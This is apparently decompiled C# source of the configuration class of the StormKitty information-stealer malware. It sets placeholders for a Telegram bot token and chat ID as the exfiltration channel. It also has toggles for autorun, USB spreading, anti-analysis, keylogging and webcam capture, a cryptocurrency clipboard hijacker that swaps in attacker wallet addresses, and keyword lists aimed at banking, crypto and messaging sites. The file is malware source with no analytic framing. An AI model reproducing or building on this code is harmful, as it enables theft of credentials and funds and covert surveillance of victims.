using System;
using System.Collections.Generic;
using StormKitty.Implant;

namespace StormKitty
{
	// Token: 0x02000042 RID: 66
	internal sealed class Config
	{
		// Token: 0x06000118 RID: 280 RVA: 0x00009098 File Offset: 0x00007298
		public static void Init()
		{
			Config.TelegramAPI = StringsCrypt.DecryptConfig(Config.TelegramAPI);
			Config.TelegramID = StringsCrypt.DecryptConfig(Config.TelegramID);
			if (Config.ClipperModule == "1")
			{
				Config.ClipperAddresses["btc"] = StringsCrypt.DecryptConfig(Config.ClipperAddresses["btc"]);
				Config.ClipperAddresses["eth"] = StringsCrypt.DecryptConfig(Config.ClipperAddresses["eth"]);
				Config.ClipperAddresses["xmr"] = StringsCrypt.DecryptConfig(Config.ClipperAddresses["xmr"]);
				Config.ClipperAddresses["xlm"] = StringsCrypt.DecryptConfig(Config.ClipperAddresses["xlm"]);
				Config.ClipperAddresses["xrp"] = StringsCrypt.DecryptConfig(Config.ClipperAddresses["xrp"]);
				Config.ClipperAddresses["ltc"] = StringsCrypt.DecryptConfig(Config.ClipperAddresses["ltc"]);
				Config.ClipperAddresses["bch"] = StringsCrypt.DecryptConfig(Config.ClipperAddresses["bch"]);
			}
		}

		// Token: 0x0600011A RID: 282 RVA: 0x000091D4 File Offset: 0x000073D4
		// Note: this type is marked as 'beforefieldinit'.
		static Config()
		{
			Dictionary<string, string[]> dictionary = new Dictionary<string, string[]>();
			dictionary["Document"] = new string[0];
			dictionary["DataBase"] = new string[]
			{
				"dat",
				"wallet"
			};
			dictionary["SourceCode"] = new string[0];
			dictionary["Image"] = new string[0];
			Config.GrabberFileTypes = dictionary;
		}

		// Token: 0x0400006B RID: 107
		public static string TelegramAPI = "--- Telegram API ---";

		// Token: 0x0400006C RID: 108
		public static string TelegramID = "--- Telegram ID ---";

		// Token: 0x0400006D RID: 109
		public static string Mutex = "--- Mutex ---";

		// Token: 0x0400006E RID: 110
		public static string AntiAnalysis = "0";

		// Token: 0x0400006F RID: 111
		public static string Autorun = "--- Startup ---";

		// Token: 0x04000070 RID: 112
		public static string StartDelay = "1";

		// Token: 0x04000071 RID: 113
		public static string Sleeptime = "--- Sleep ---";

		// Token: 0x04000072 RID: 114
		public static string usbspread = "--- USB ---";

		// Token: 0x04000073 RID: 115
		public static string password = "--- password ---";

		// Token: 0x04000074 RID: 116
		public static string WebcamScreenshot = "1";

		// Token: 0x04000075 RID: 117
		public static string KeyloggerModule = "0";

		// Token: 0x04000076 RID: 118
		public static string ClipperModule = "--- Clipper ---";

		// Token: 0x04000077 RID: 119
		public static int OppToMissDef = 2;

		// Token: 0x04000078 RID: 120
		public static string btc = "--- BTC ---";

		// Token: 0x04000079 RID: 121
		public static string[] walletsbtc = new string[]
		{
			"--- BTC ---"
		};

		// Token: 0x0400007A RID: 122
		public static string[] walletseth = new string[]
		{
			"--- Etherium ---"
		};

		// Token: 0x0400007B RID: 123
		public static string[] walletsltc = new string[]
		{
			"--- LiteCoin ---"
		};

		// Token: 0x0400007C RID: 124
		public static string[] walletsxmr = new string[]
		{
			"--- Monero ---"
		};

		// Token: 0x0400007D RID: 125
		public static Dictionary<string, string> ClipperAddresses = new Dictionary<string, string>
		{
			{
				"btc",
				"--- ClipperBTC ---"
			},
			{
				"eth",
				"--- ClipperETH ---"
			},
			{
				"xmr",
				"--- ClipperXMR ---"
			},
			{
				"xlm",
				"--- ClipperXLM ---"
			},
			{
				"xrp",
				"--- ClipperXRP ---"
			},
			{
				"ltc",
				"--- ClipperLTC ---"
			},
			{
				"bch",
				"--- ClipperBCH ---"
			}
		};

		// Token: 0x0400007E RID: 126
		public static string[] KeyloggerServices = new string[]
		{
			"facebook",
			"twitter",
			"chat",
			"telegram",
			"skype",
			"discord",
			"viber",
			"message",
			"gmail",
			"protonmail",
			"outlook",
			"password",
			"encryption",
			"account",
			"login",
			"key",
			"sign in",
			"пароль",
			"bank",
			"банк",
			"credit",
			"card",
			"кредит",
			"shop",
			"buy",
			"sell",
			"купить"
		};

		// Token: 0x0400007F RID: 127
		public static string[] BankingServices = new string[]
		{
			"qiwi",
			"money",
			"exchange",
			"citi",
			"bank",
			"credit",
			"card",
			"банк",
			"кредит",
			"bankofamerica",
			"wellsfargo",
			"chase"
		};

		// Token: 0x04000080 RID: 128
		public static string[] CryptoServices = new string[]
		{
			"bitcoin",
			"monero",
			"dashcoin",
			"litecoin",
			"etherium",
			"stellarcoin",
			"btc",
			"eth",
			"xmr",
			"xlm",
			"xrp",
			"ltc",
			"bch",
			"blockchain",
			"paxful",
			"investopedia",
			"buybitcoinworldwide",
			"cryptocurrency",
			"crypto",
			"trade",
			"trading",
			"биткоин",
			"wallet"
		};

		// Token: 0x04000081 RID: 129
		public static string[] PornServices = new string[]
		{
			"porn",
			"sex",
			"hentai",
			"порно",
			"sex"
		};

		// Token: 0x04000082 RID: 130
		public static int GrabberSizeLimit = 5120;

		// Token: 0x04000083 RID: 131
		public static Dictionary<string, string[]> GrabberFileTypes;
	}
}
